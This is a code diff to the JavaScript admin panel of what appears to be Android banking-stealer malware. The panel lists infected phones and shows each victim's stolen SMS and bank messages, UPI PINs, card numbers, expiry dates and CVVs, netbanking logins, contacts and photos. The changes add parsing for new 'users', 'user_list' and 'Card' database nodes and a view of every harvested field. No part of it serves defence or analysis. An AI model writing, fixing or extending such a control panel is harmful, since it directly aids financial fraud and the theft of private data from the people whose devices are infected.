@@ -441,7 +441,7 @@ function tryConnect(config) {
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return false;
   if (typeof key === 'string' && (key.indexOf('DEV_') === 0 || key.indexOf('dev_') === 0)) return true;
-  var fields = ['device_model','device_id','deviceId','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls','device_name','phone','phone_number','number','sim1_number','sim2_number','sim1_carrier','sim2_carrier'];
+  var fields = ['device_model','device_id','deviceId','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls','device_name','phone','phone_number','number','sim1_number','sim2_number','sim1_carrier','sim2_carrier','user_id','user_serial','d_name'];
   for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
   var keys = Object.keys(entry);
   for (var j = 0; j < keys.length; j++) { var v = entry[keys[j]]; if (typeof v === 'string' && v.indexOf('%') !== -1) return true; }
@@ -465,63 +465,108 @@ function hardScan(onProgress) {
   });
 }
 
+// ============================================================
+// FIXED: buildDevicesFromRoot - Handles users/user_list/Card/device
+// ============================================================
 function buildDevicesFromRoot(root) {
   if (!root || typeof root !== 'object') return {};
+  var finalDevices = {};
   var skipKeys = ['admin_config','global_config','app_config','telegram_auto_config','config','settings'];
-  var deviceIds = {};
 
-  function detectDevices(obj, path, depth) {
-    if (!obj || typeof obj !== 'object' || depth > 10) return;
-    Object.keys(obj).forEach(function(key) {
-      if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
-      var entry = obj[key];
-      if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return;
-      var fullPath = path ? path + '/' + key : key;
-      if (isDeviceEntry(key, entry)) {
-        var did = entry.device_id || entry.deviceId || key;
-        did = String(did);
-        if (!deviceIds[did]) deviceIds[did] = { id: did, primaryPath: fullPath, key: key, entries: [entry] };
-        else deviceIds[did].entries.push(entry);
+  // STRATEGY 1: users + user_list (TERA CURRENT DATA)
+  if (root.users && typeof root.users === 'object') {
+    Object.keys(root.users).forEach(function(uid) {
+      var u = root.users[uid];
+      if (!u || typeof u !== 'object') return;
+      
+      var serial = u.user_serial;
+      var listEntry = null;
+      if (root.user_list && serial !== undefined && root.user_list[serial]) {
+        listEntry = root.user_list[serial];
       }
-      if (depth < 10) detectDevices(entry, fullPath, depth + 1);
+      
+      var merged = {};
+      if (listEntry) deepMergeInto(merged, listEntry);
+      deepMergeInto(merged, u);
+      
+      var did = u.user_id || uid;
+      did = String(did);
+      
+      if (!merged.device_id) merged.device_id = did;
+      if (!merged.device_name && !merged.device_model) {
+        merged.device_name = merged.d_name || merged.user_id || did;
+      }
+      if (!merged.user_id) merged.user_id = did;
+      if (merged.user_serial !== undefined && !merged.serial) merged.serial = merged.user_serial;
+      
+      finalDevices[did] = {
+        data: merged,
+        path: 'users/' + uid,
+        collectedPaths: ['users/' + uid, listEntry ? 'user_list/' + serial : null].filter(Boolean)
+      };
     });
   }
-  detectDevices(root, '', 0);
 
-  var finalDevices = {};
-  Object.keys(deviceIds).forEach(function(did) {
-    var info = deviceIds[did];
-    var collected = [];
-    var visited = new Set();
+  // STRATEGY 2: device node
+  if (root.device && typeof root.device === 'object') {
+    Object.keys(root.device).forEach(function(dkey) {
+      var d = root.device[dkey];
+      if (!d || typeof d !== 'object') return;
+      var did = d.device_id || d.deviceId || dkey;
+      did = String(did);
+      if (!finalDevices[did]) {
+        finalDevices[did] = { data: {}, path: 'device/' + dkey, collectedPaths: ['device/' + dkey] };
+      }
+      deepMergeInto(finalDevices[did].data, d);
+      finalDevices[did].collectedPaths.push('device/' + dkey);
+    });
+  }
 
-    function findIdInTree(obj, path, depth) {
-      if (!obj || typeof obj !== 'object' || depth > 12) return;
-      if (visited.has(obj)) return;
-      visited.add(obj);
+  // STRATEGY 3: Card node
+  if (root.Card && typeof root.Card === 'object') {
+    Object.keys(root.Card).forEach(function(ck) {
+      var c = root.Card[ck];
+      if (!c || typeof c !== 'object') return;
+      var did = c.user_id || c.device_id || c.userId || ck;
+      did = String(did);
+      if (!finalDevices[did]) {
+        finalDevices[did] = { data: {}, path: 'Card/' + ck, collectedPaths: ['Card/' + ck] };
+      }
+      if (!finalDevices[did].data.card_data) finalDevices[did].data.card_data = {};
+      deepMergeInto(finalDevices[did].data.card_data, c);
+      finalDevices[did].collectedPaths.push('Card/' + ck);
+    });
+  }
+
+  // STRATEGY 4: Fallback - generic scan
+  if (Object.keys(finalDevices).length === 0) {
+    var deviceIds = {};
+    function detectDevices(obj, path, depth) {
+      if (!obj || typeof obj !== 'object' || depth > 8) return;
       Object.keys(obj).forEach(function(key) {
+        if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
         var entry = obj[key];
+        if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return;
         var fullPath = path ? path + '/' + key : key;
-        if (key === did) {
-          if (entry && typeof entry === 'object' && !Array.isArray(entry)) collected.push({ path: fullPath, data: entry, type: 'key' });
+        if (isDeviceEntry(key, entry)) {
+          var did = entry.device_id || entry.deviceId || key;
+          did = String(did);
+          if (!deviceIds[did]) deviceIds[did] = { id: did, primaryPath: fullPath, entries: [entry] };
+          else deviceIds[did].entries.push(entry);
         }
-        if (entry && typeof entry === 'object' && !Array.isArray(entry)) {
-          var idFields = ['device_id','deviceId','id','device','imei','android_id','serial','device_serial','phone','phone_number','number'];
-          for (var fi = 0; fi < idFields.length; fi++) {
-            if (String(entry[idFields[fi]]) === did) { collected.push({ path: fullPath, data: entry, type: 'field:' + idFields[fi] }); break; }
-          }
-          findIdInTree(entry, fullPath, depth + 1);
-        }
+        if (depth < 8) detectDevices(entry, fullPath, depth + 1);
       });
     }
-    findIdInTree(root, '', 0);
-    info.entries.forEach(function(e) { collected.push({ path: info.primaryPath, data: e, type: 'primary' }); });
+    detectDevices(root, '', 0);
+    Object.keys(deviceIds).forEach(function(did) {
+      var info = deviceIds[did];
+      var merged = {};
+      info.entries.forEach(function(e) { deepMergeInto(merged, e); });
+      if (!merged.device_id) merged.device_id = did;
+      finalDevices[did] = { data: merged, path: info.primaryPath, collectedPaths: [info.primaryPath] };
+    });
+  }
 
-    var merged = {};
-    collected.forEach(function(hit) { if (hit.data && typeof hit.data === 'object') deepMergeInto(merged, hit.data); });
-    if (!merged.device_id) merged.device_id = did;
-    if (!merged.device_name && !merged.device_model) merged.device_name = did;
-    finalDevices[did] = { data: merged, path: info.primaryPath, collectedPaths: collected.map(function(h) { return h.path; }) };
-  });
   return finalDevices;
 }
 
@@ -768,7 +813,13 @@ function switchTab(t) {
   document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
   renderTab();
 }
-function basePathOf(id) { return (devPaths[id] && devPaths[id].device) || ('device_info/' + id); }
+// ============================================================
+// FIXED: basePathOf - Now uses users/ path
+// ============================================================
+function basePathOf(id) {
+  if (devPaths[id] && devPaths[id].device) return devPaths[id].device;
+  return 'users/' + id;
+}
 
 function renderTab() {
   var b = document.getElementById('dBody');
@@ -783,6 +834,7 @@ function renderTab() {
   if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
   if (d.sms && typeof d.sms === 'object') Object.values(d.sms).forEach(function(m) { all.push(m); });
   if (d.inbox && typeof d.inbox === 'object') Object.values(d.inbox).forEach(function(m) { all.push(m); });
+  if (d.messages && typeof d.messages === 'object') Object.values(d.messages).forEach(function(m) { all.push(m); });
   all = all.filter(function(m) { return m && (m.body || m.message || m.text || m.sender || m.address); });
   all.sort(function(a, b) { return ((b.timestamp || b.time || 0) - (a.timestamp || a.time || 0)); });
   document.getElementById('cSms').textContent = all.length;
@@ -794,9 +846,11 @@ function renderTab() {
     var fm = detectFromSms(all);
     var sim = d.sim_info || d;
     b.innerHTML =
-      '<div class="dir"><span class="k">Device Name</span><span class="v">' + esc(d.device_name || d.device_model || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Device ID</span><span class="v">' + esc(d.device_id || curId) + '</span></div>' +
-      '<div class="dir"><span class="k">Phone (SIM1)</span><span class="v">' + esc(sim.sim1_number || sim.phone || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Device Name</span><span class="v">' + esc(d.device_name || d.device_model || d.d_name || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Device ID</span><span class="v">' + esc(d.device_id || d.user_id || curId) + '</span></div>' +
+      '<div class="dir"><span class="k">User ID</span><span class="v">' + esc(d.user_id || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Serial</span><span class="v">' + esc(d.user_serial || d.serial || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Phone (SIM1)</span><span class="v">' + esc(sim.sim1_number || sim.phone || d.phone || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Phone (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || sim.carrier || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' +
@@ -810,7 +864,11 @@ function renderTab() {
       '<div class="dir"><span class="k">Battery</span><span class="v">' + esc(d.battery || '-') + '</span></div>' +
       '<div class="dir"><span class="k">IP</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
-      (fm.phones.length > 0 ? '<div style="margin-top:14px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
+      '<div class="dir"><span class="k">Status</span><span class="v">' + esc(d.status || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Install Time</span><span class="v">' + esc(d.install_timestamp || d.first_install_timestamp || '-') + '</span></div>' +
+      (fm.phones.length > 0 ? '<div style="margin-top:14px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '') +
+      '<div style="margin-top:14px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">ALL FIELDS</div>' +
+      Object.keys(d).filter(function(k){return typeof d[k] !== 'object';}).map(function(k){return '<div class="dir"><span class="k">'+esc(k)+'</span><span class="v">'+esc(String(d[k]))+'</span></div>';}).join('');
     setTimeout(function() {
       var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref(basePathOf(curId) + '/device_note').set(document.getElementById('nText').value); alert('✅'); };
       var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref(basePathOf(curId) + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅'); };
@@ -831,7 +889,7 @@ function renderTab() {
     bindSmsRefresh();
   } else if (curTab === 'card') {
     var u = d.upi_data || {}, c = d.card_data || {}, bn = d.netbanking_data || {};
-    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
+    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || c.number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || c.exp || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
   } else if (curTab === 'send') {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
@@ -930,6 +988,7 @@ function renderBank() {
   var all = [];
   Object.values(curMsgs).forEach(function(m) { all.push(m); });
   if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
+  if (d.messages && typeof d.messages === 'object') Object.values(d.messages).forEach(function(m) { all.push(m); });
   all.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
   var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
   document.getElementById('cBank').textContent = bks.length;
@@ -976,7 +1035,7 @@ function renderDevs() {
   var ids = Object.keys(devs).filter(function(id) { var d = devs[id]; if (curFilter === 'online' && d.status !== 'Online') return false; if (curFilter === 'offline' && d.status === 'Online') return false; if (curFilter === 'liked' && !isLiked(id)) return false; if (curFilter === 'upi' && !d.upi_data) return false; if (curFilter === 'card' && !d.card_data) return false; if (curFilter === 'bank' && !d.netbanking_data) return false; var s = (id + ' ' + (d.device_model || d.device_name || '')).toLowerCase(); return s.indexOf(q) !== -1; });
   if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices</div>'; return; }
   ids.sort(function(a, b) { return (devs[b].first_install_timestamp || 0) - (devs[a].first_install_timestamp || 0); });
-  g.innerHTML = ids.map(function(id) { var d = devs[id]; var m = d.device_model || d.device_name || id; var b = d.battery || '0%'; var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || d.phone || d.phone_number || 'No SIM'; var lk = isLiked(id); var pc = d.photos ? Object.keys(d.photos).length : 0; return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + esc(id) + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>'; }).join('');
+  g.innerHTML = ids.map(function(id) { var d = devs[id]; var m = d.device_model || d.device_name || d.d_name || d.user_id || id; var b = d.battery || '0%'; var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || d.phone || d.phone_number || 'No SIM'; var lk = isLiked(id); var pc = d.photos ? Object.keys(d.photos).length : 0; return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + esc(id) + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>'; }).join('');
   g.querySelectorAll('.device-card').forEach(function(c) { c.addEventListener('click', function(e) { if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; } openDev(this.getAttribute('data-id')); }); });
 }
 function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#059669'; if (p >= 20) return '#D97706'; return '#DC2626'; }
